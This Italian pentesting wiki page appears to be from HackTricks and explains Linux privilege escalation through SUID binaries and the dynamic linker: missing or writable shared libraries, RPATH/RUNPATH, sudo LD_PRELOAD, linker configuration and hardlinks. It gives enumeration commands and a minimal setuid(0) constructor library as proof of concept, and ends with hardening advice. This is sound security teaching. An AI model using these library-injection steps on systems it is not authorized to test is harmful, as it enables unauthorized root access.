# Abuso di librerie condivise e linker con SUID

{{#include ../../banners/hacktricks-training.md}}

Di solito si esaminano i binari SUID per individuare l'esecuzione diretta di comandi, ma anche i programmi SUID personalizzati possono essere vulnerabili tramite il dynamic linker. Il tema comune è semplice: un eseguibile con privilegi carica codice da un percorso o da una configurazione che un utente con privilegi inferiori può influenzare.<sup>[[1]](#references)</sup>

Questa pagina si concentra su schemi generici di tecniche: librerie mancanti, directory di librerie scrivibili, `RPATH`/`RUNPATH`, `LD_PRELOAD` tramite sudo, configurazione del linker e confusione sugli hardlink SUID.

Per informazioni sugli ELF program header, sulla dynamic section e sul comportamento del loader alla base di questi controlli, consulta [Informazioni di base sugli ELF](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Enumerazione rapida

Inizia cercando i file SUID insoliti e controllando se sono collegati dinamicamente:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Usa `readelf` per un eseguibile non familiare: [`ldd` potrebbe eseguire un interprete ELF non attendibile](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` mostra le dipendenze dirette, quindi verifica separatamente il percorso effettivamente scelto dal loader.<sup>[[1]](#references)[[3]](#references)</sup>

Concentrati su percorsi non standard, percorsi di applicazioni personalizzati, binari di proprietà di root ma esterni alle directory gestite dai pacchetti e dipendenze caricate da directory scrivibili.<sup>[[1]](#references)</sup>

Controlli utili della scrivibilità:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Iniezione di Shared Object mancanti

Alcuni binari SUID personalizzati provano a caricare uno shared object inesistente. Se il percorso mancante si trova in una directory controllata dall'attaccante, il binario potrebbe caricare codice fornito dall'attaccante con i privilegi dell'utente effettivo.<sup>[[1]](#references)</sup>

Lo stesso vale per un **binario personalizzato consentito tramite sudo** quando chiama `dlopen()` su un percorso assoluto `.so` all'interno di una directory home o di configurazione scrivibile dall'utente chiamante. Questo caricamento tardivo della libreria potrebbe non comparire nell'output di `ldd` né nelle voci ELF `NEEDED`. Un'analisi circoscritta con `strings` o il tracciamento di un'invocazione **senza privilegi** può rivelare il percorso tentato; una password dell'applicazione o una scelta nel menu potrebbero condizionare la ricerca. Verifica la regola sudo effettiva, il percorso esatto e i permessi della directory padre, e che l'invocazione privilegiata raggiunga tale ricerca prima di considerarla un'escalation. Non invocare il target sudo soltanto per enumerarlo.

Individua le ricerche di librerie non riuscite con il filtro delle syscall di `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Se il binario cerca `libexample.so` in un percorso scrivibile, una libreria dimostrativa minima può usare un costruttore. Mantieni innocua la dimostrazione dell’impatto durante la convalida:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Compilalo con il nome file esatto che il binario tenta di caricare:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

La condizione sfruttabile non è semplicemente l'assenza della libreria. L'attaccante deve poter collocare un oggetto condiviso compatibile in un percorso accettato dal loader con privilegi elevati.<sup>[[1]](#references)</sup>

## Directory della libreria scrivibile

A volte tutte le dipendenze sono presenti, ma una delle directory usate per risolverle è scrivibile. Ciò può consentire di sostituire una libreria caricata o di inserire una libreria con priorità più alta avente lo stesso nome.<sup>[[1]](#references)</sup>

La stessa analisi si applica a un ELF personalizzato **consentito tramite sudo**, anche quando l'ELF non ha il bit SUID e l'account RunAs consentito non è root. Confronta le voci `DT_NEEDED` con il percorso della libreria che il loader risolverà; poi verifica se il chiamante può scrivere in quel file o sostituirlo tramite una directory padre scrivibile e attraversabile. Conferma la regola sudo esatta per RunAs, i symlink e gli ACL, i criteri del loader e che il processo di destinazione carichi la libreria con l'account dai privilegi più elevati. Un `.so` scrivibile o il solo nome di una dipendenza sono soltanto indizi; esamina i metadati senza eseguire il comando sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Esamina i percorsi delle dipendenze:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Se la directory è scrivibile, verifica con un approccio sicuro basato su copie in un lab. Sostituire le librerie di sistema su un host attivo può lasciare i processi che si avviano contemporaneamente con versioni incoerenti delle librerie.<sup>[[8]](#references)</sup>

### Librerie scrivibili all'interno di un chroot

Un chroot da solo non chiude i file descriptor ereditati né confina ogni accesso al filesystem. Se una sandbox lascia un file descriptor di directory che punta al di fuori della nuova root e il processo confinato può dereferenziare quel descriptor (ad esempio tramite una voce accessibile in `/proc/<pid>/fd/`), i percorsi dell'host potrebbero restare raggiungibili. Questo è un problema di confine del filesystem; da solo non concede privilegi di root.<sup>[[11]](#references)[[12]](#references)</sup>

Verifica separatamente se l'utente confinato può scrivere in una directory di librerie che verrà usata da un **eseguibile dell'host con SUID di root** quando viene avviato dal jail. Il loader risolve le dipendenze nella vista del filesystem del processo, quindi una libreria controllata dall'attaccante in quella directory potrebbe essere eseguita con l'identità effettiva del programma SUID. Conferma l'eseguibile esatto, il suo bit SUID e le policy di mount, il target e i permessi di accesso del descriptor, il percorso di ricerca delle librerie del jail e che il programma possa effettivamente raggiungere l'eseguibile dell'host. Una file capability sul launcher della sandbox, un jail scrivibile o un binario SUID dell'host, da soli, sono solo indizi; la catena completa dipende dall'implementazione della sandbox.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH e RUNPATH

`RPATH` e `RUNPATH` sono voci della sezione dinamica che indicano al loader dove cercare le librerie. Sono pericolose nei programmi SUID quando puntano a directory scrivibili dall'attaccante.<sup>[[1]](#references)</sup>

Individuarle:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Esempio di output rischioso:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Se `/opt/app/lib` è scrivibile e il binario necessita di `libcustom.so`, l'attaccante potrebbe riuscire a inserirvi una `libcustom.so` malevola:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` e `RUNPATH` non sono identici in tutti i dettagli della risoluzione, ma per la verifica dell'escalation dei privilegi la domanda pratica è la stessa: il binario SUID cerca una libreria in una directory scrivibile da un attacker?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Per i programmi normali, `LD_PRELOAD` e `LD_LIBRARY_PATH` possono forzare o influenzare il caricamento degli oggetti condivisi. Per i programmi SUID, il dynamic loader entra normalmente in modalità di esecuzione sicura e ignora le variabili d'ambiente pericolose.<sup>[[1]](#references)</sup>

Questo significa che un semplice binario SUID di solito non è vulnerabile solo perché l'utente può impostare `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

L'eccezione più comune è una policy sudo che consente di assegnare variabili d'ambiente dalla riga di comando per il target, ad esempio tramite un tag `SETENV` o un'opzione `setenv` applicabile. Se il target è collegato dinamicamente e sudo accetta `LD_PRELOAD=/path/to/library`, il target potrebbe caricare codice controllato dall'utente. Verifica la regola effettiva e l'identità del target. Aggiungere semplicemente `LD_PRELOAD` a `env_keep` non è sufficiente sui sistemi in cui il dynamic loader rimuove un `LD_PRELOAD` ereditato prima che il processo `sudo` SUID venga avviato; sudo valuta un'assegnazione da riga di comando dopo il proprio avvio.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Non confondere questi casi: le regole del loader e della policy di sudo riportate sopra li distinguono:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contro un normale binario SUID: di solito bloccato dall’esecuzione sicura.
- `LD_PRELOAD` accettato come assegnazione da riga di comando di sudo per un target privilegiato e collegato dinamicamente: potenzialmente sfruttabile.
- `.so` mancante in un percorso scrivibile: sfruttabile quando il binario SUID carica normalmente quel percorso.
- `RPATH`/`RUNPATH` verso una directory scrivibile: sfruttabile quando è possibile controllare una libreria necessaria.
- Accesso in scrittura a `/etc/ld.so.preload` o alla configurazione del linker: impatto elevato sull’intero sistema.

## Configurazione del linker

`ld.so` usa la cache del linker e `/etc/ld.so.preload`; `ldconfig` crea quella cache a partire da `/etc/ld.so.conf` e dai file inclusi, comunemente da `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Controlli di alto valore:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Una configurazione del linker scrivibile è solitamente più grave di un singolo binario SUID vulnerabile, perché può influire su molti processi collegati dinamicamente. `/etc/ld.so.preload` è particolarmente pericoloso perché può forzare il caricamento di un shared object nei processi privilegiati.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Confusione con hardlink SUID

Gli hardlink possono far apparire lo stesso inode SUID con nomi diversi.<sup>[[9]](#references)</sup> Questo è utile per nascondere un helper privilegiato, confondere le operazioni di pulizia o aggirare le verifiche ingenue basate sui percorsi.

Trova i file SUID con più di un link:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Ispeziona tutti i percorsi allo stesso inode:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

L'abuso non consiste nel fatto che un hardlink modifichi i permessi. Si tratta di confusione dei percorsi: un inode privilegiato potrebbe essere raggiungibile tramite un nome che i difensori o gli script non si aspettano.<sup>[[9]](#references)</sup> Per approfondire gli inode e il workflow degli hardlink, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Note difensive

- Mantieni i binari SUID al minimo, sottoposti ad audit e gestiti tramite pacchetti, ove possibile.
- Evita voci `RPATH`/`RUNPATH` che puntano a directory scrivibili o gestite dalle applicazioni.<sup>[[1]](#references)[[8]](#references)</sup>
- Mantieni le directory delle librerie di proprietà di root e non scrivibili dagli utenti normali.<sup>[[8]](#references)</sup>
- Non preservare `LD_PRELOAD`, `LD_LIBRARY_PATH` o variabili simili del loader tramite sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitora `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e i file SUID inattesi.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Esamina i file SUID con hardlink e verifica i wrapper SUID personalizzati al di fuori dei percorsi di sistema standard.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Pagina del manuale Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Attributi comuni (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening del linker dinamico (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hardlink (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
